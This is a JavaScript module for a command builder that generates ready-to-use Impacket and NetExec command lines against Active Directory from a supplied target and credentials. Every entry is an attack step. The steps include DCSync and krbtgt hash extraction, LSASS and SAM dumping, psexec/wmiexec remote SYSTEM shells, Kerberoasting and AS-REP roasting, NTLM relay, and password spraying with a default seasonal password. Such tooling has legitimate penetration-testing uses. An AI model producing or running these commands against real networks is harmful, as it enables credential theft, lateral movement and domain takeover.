// Impacket / NetExec command builder. Assembles the command line for well-known public
// AD tools from your target + credentials. Nothing runs here — it only formats the string.

// auth spec for impacket's "[domain/]user[:password]@target"
function target(o, withTarget = true) {
  const dom = o.domain ? o.domain + '/' : '';
  const cred = o.hash ? o.user : `${o.user}:${o.pass || ''}`;
  return `${dom}${cred}${withTarget ? '@' + (o.target || 'TARGET') : ''}`;
}
const secret = (o) => (o.hash ? `-hashes :${o.hash}` : o.kerb ? '-k -no-pass' : '');
const dcip = (o) => (o.dcip ? `-dc-ip ${o.dcip}` : '');
const nxcAuth = (o) => `-u ${o.user} ${o.hash ? '-H ' + o.hash : "-p '" + (o.pass || '') + "'"}${o.domain ? ' -d ' + o.domain : ''}`;

export const TOOLS = [
  // Credential access
  { id: 'secretsdump', group: 'Credentials', name: 'secretsdump (DCSync / SAM / LSA)',
    build: (o) => `impacket-secretsdump ${target(o)} ${secret(o)} ${dcip(o)}`.replace(/\s+/g, ' ').trim(),
    alt: (o) => `nxc smb ${o.target || 'TARGET'} ${nxcAuth(o)} --ntds` },
  { id: 'secretsdump-dcsync', group: 'Credentials', name: 'secretsdump — DCSync one user',
    build: (o) => `impacket-secretsdump ${target(o, false)}@${o.dcip || 'DC_IP'} ${secret(o)} -just-dc-user ${o.extra || 'krbtgt'}`.replace(/\s+/g, ' ').trim() },
  { id: 'lsassy', group: 'Credentials', name: 'NetExec — dump LSASS', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'TARGET'} ${nxcAuth(o)} -M lsassy` },
  { id: 'sam', group: 'Credentials', name: 'NetExec — dump SAM', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'TARGET'} ${nxcAuth(o)} --sam` },
  // Execution
  { id: 'psexec', group: 'Execution', name: 'psexec (SYSTEM shell)',
    build: (o) => `impacket-psexec ${target(o)} ${secret(o)}`.replace(/\s+/g, ' ').trim() },
  { id: 'wmiexec', group: 'Execution', name: 'wmiexec (semi-interactive, stealthier)',
    build: (o) => `impacket-wmiexec ${target(o)} ${secret(o)}`.replace(/\s+/g, ' ').trim() },
  { id: 'smbexec', group: 'Execution', name: 'smbexec',
    build: (o) => `impacket-smbexec ${target(o)} ${secret(o)}`.replace(/\s+/g, ' ').trim() },
  { id: 'atexec', group: 'Execution', name: 'atexec (scheduled task)',
    build: (o) => `impacket-atexec ${target(o)} ${secret(o)} "${o.extra || 'whoami'}"`.replace(/\s+/g, ' ').trim() },
  { id: 'nxc-exec', group: 'Execution', name: 'NetExec — run a command', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'TARGET'} ${nxcAuth(o)} -x '${o.extra || 'whoami'}'` },
  // Kerberos
  { id: 'kerberoast', group: 'Kerberos', name: 'GetUserSPNs (Kerberoast)',
    build: (o) => `impacket-GetUserSPNs ${target(o, false)} ${dcip(o)} ${secret(o)} -request`.replace(/\s+/g, ' ').trim(),
    alt: (o) => `nxc ldap ${o.dcip || 'DC_IP'} ${nxcAuth(o)} --kerberoasting kerb.txt` },
  { id: 'asreproast', group: 'Kerberos', name: 'GetNPUsers (AS-REP roast)',
    build: (o) => `impacket-GetNPUsers ${o.domain || 'DOMAIN'}/ -usersfile users.txt -dc-ip ${o.dcip || 'DC_IP'} -request -format hashcat`,
    alt: (o) => `nxc ldap ${o.dcip || 'DC_IP'} ${nxcAuth(o)} --asreproast asrep.txt` },
  { id: 'gettgt', group: 'Kerberos', name: 'getTGT (request a ticket)',
    build: (o) => `impacket-getTGT ${target(o, false)} ${secret(o)} ${dcip(o)}`.replace(/\s+/g, ' ').trim() },
  // Relay / enumeration
  { id: 'ntlmrelayx', group: 'Relay', name: 'ntlmrelayx (NTLM relay)',
    build: (o) => `impacket-ntlmrelayx -tf targets.txt -smb2support ${o.extra ? o.extra : '-i'}` },
  { id: 'nxc-shares', group: 'Enumeration', name: 'NetExec — list shares', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'TARGET/CIDR'} ${nxcAuth(o)} --shares` },
  { id: 'nxc-users', group: 'Enumeration', name: 'NetExec — domain users / pass policy', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'DC_IP'} ${nxcAuth(o)} --users --pass-pol` },
  { id: 'nxc-spray', group: 'Enumeration', name: 'NetExec — password spray', tool: 'nxc',
    build: (o) => `nxc smb ${o.target || 'DC_IP'} -u users.txt -p '${o.pass || 'Season2025!'}' ${o.domain ? '-d ' + o.domain : ''} --continue-on-success`.replace(/\s+/g, ' ').trim() },
];
export const GROUPS = [...new Set(TOOLS.map((t) => t.group))];
